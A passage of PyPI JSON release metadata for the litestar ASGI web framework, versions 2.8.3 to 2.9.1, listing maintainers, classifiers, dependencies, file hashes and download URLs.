Framework","version":"2.8.3","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"b9e73d7ca62d6c48ff4c8162e2f03264c3202d8a76cb6a4987eac67f27af1de5","md5":"f887c568407380297c383943d11e6e7e","sha256":"bef5e8592b1afba24306f9a5834d84cef89826b12f58a97d3099cf49e2f3767d"},"downloads":-1,"filename":"litestar-2.8.3-py3-none-any.whl","has_sig":false,"md5_digest":"f887c568407380297c383943d11e6e7e","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":523983,"upload_time":"2024-05-06T07:10:24","upload_time_iso_8601":"2024-05-06T07:10:24.981703Z","url":"https://files.pythonhosted.org/packages/b9/e7/3d7ca62d6c48ff4c8162e2f03264c3202d8a76cb6a4987eac67f27af1de5/litestar-2.8.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f09e35000a2e42c92a67eae13aa0ae84f479f8ba8a522a054e877e6874a12068","md5":"61feda3c51e5fbd0dd70d9c025bf819f","sha256":"3764eef3885b331bfb15c478a2b9e2bc1980741ff58bd5512d599436f669549c"},"downloads":-1,"filename":"litestar-2.8.3.tar.gz","has_sig":false,"md5_digest":"61feda3c51e5fbd0dd70d9c025bf819f","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":684508,"upload_time":"2024-05-06T07:10:29","upload_time_iso_8601":"2024-05-06T07:10:29.556613Z","url":"https://files.pythonhosted.org/packages/f0/9e/35000a2e42c92a67eae13aa0ae84f479f8ba8a522a054e877e6874a12068/litestar-2.8.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.9.0":{"info":{"author":null,"author_email":"Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter@litestar.dev>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.9.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","python-jose; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.9.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"597ee2e6a9a0f32ab5a0527ce9b8cc3d208a1c0201d4bd0ee0f10d02946c3dd7","md5":"c85ae31aa7050ebb04ed698c15c65621","sha256":"25235ad99f08807e633347fa509dcf5989153bde9b6a82e521b1f056af33becc"},"downloads":-1,"filename":"litestar-2.9.0-py3-none-any.whl","has_sig":false,"md5_digest":"c85ae31aa7050ebb04ed698c15c65621","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":530244,"upload_time":"2024-06-02T16:35:41","upload_time_iso_8601":"2024-06-02T16:35:41.916070Z","url":"https://files.pythonhosted.org/packages/59/7e/e2e6a9a0f32ab5a0527ce9b8cc3d208a1c0201d4bd0ee0f10d02946c3dd7/litestar-2.9.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"79a47e1cde88fe78586ddcc88082faed91c4bf4d3931cce76bdfac24b8583675","md5":"0f4d8700f0851f3fe730b10fac47859d","sha256":"bea384c9ddae74bcb0d96ecb6dc1b51f8a13d50173cdfd56bfd2627ede505154"},"downloads":-1,"filename":"litestar-2.9.0.tar.gz","has_sig":false,"md5_digest":"0f4d8700f0851f3fe730b10fac47859d","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":695917,"upload_time":"2024-06-02T16:35:44","upload_time_iso_8601":"2024-06-02T16:35:44.511465Z","url":"https://files.pythonhosted.org/packages/79/a4/7e1cde88fe78586ddcc88082faed91c4bf4d3931cce76bdfac24b8583675/litestar-2.9.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.9.1":{"info":{"author":null,"author_email":"Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter@litestar.dev>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":["annotated-types","attrs","brotli","cli","cryptography","full","jinja","jwt","mako","minijinja","opentelemetry","piccolo","picologging","prometheus","pydantic","redis","sqlalchemy","standard","structlog"],"release_url":"https://pypi.org/project/litestar/2.9.1/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","python-jose; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.9.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"8582a2d63f79ea228e09423698c22a80db03114d84eaa917745eb88cc51fe97c","md5":"33892f9f1a3faaa71451be8fe8e1bd39","sha256":"fe3e4ec91a9c24af652775fed5fa4d789902f165cabbd7d2e62821fec1f69462"},"downloads":-1,"filename":"litestar-2.9.1-py3-none-any.whl","has_sig":false,"md5_digest":"33892f9f1a3faaa71451be8fe8e1bd39","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":530094,"upload_time":"2024-06-21T18:33:02","upload_time_iso_8601":"2024-06-21T18:33:02.727544Z","url":"https://files.pythonhosted.org/packages/85/82/a2d63f79ea228e09423698c22a80db03114d84eaa917745eb88cc51fe97c/litestar-2.9.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d48c4410073f73e784e9464ac592f9efe5436027e7af9d30855e5a90b337a8eb","md5":"b3d32c4de376803b340df645fe517510","sha256":"7c13bb4dd7b1c77f6c462262cfe401ca6429eab3e4d98f38586b68268bd5ac97"},"downloads":-1,"filename":"litestar-2.9.1.tar.gz","has_sig":false,"md5_digest":"b3d32c4de376803b340df645fe517510","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":697626,"upload_time":"2024-06-21T18:33:05","upload_time_iso_8601":"2024-06-21T18:33:05.554582Z","url":"https://files.pythonhosted.org/packages/d4/8c/4410073f73e784e9464ac592f9efe5436027e7af9d30855e5a90b337a8eb/litestar-2.9.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]}}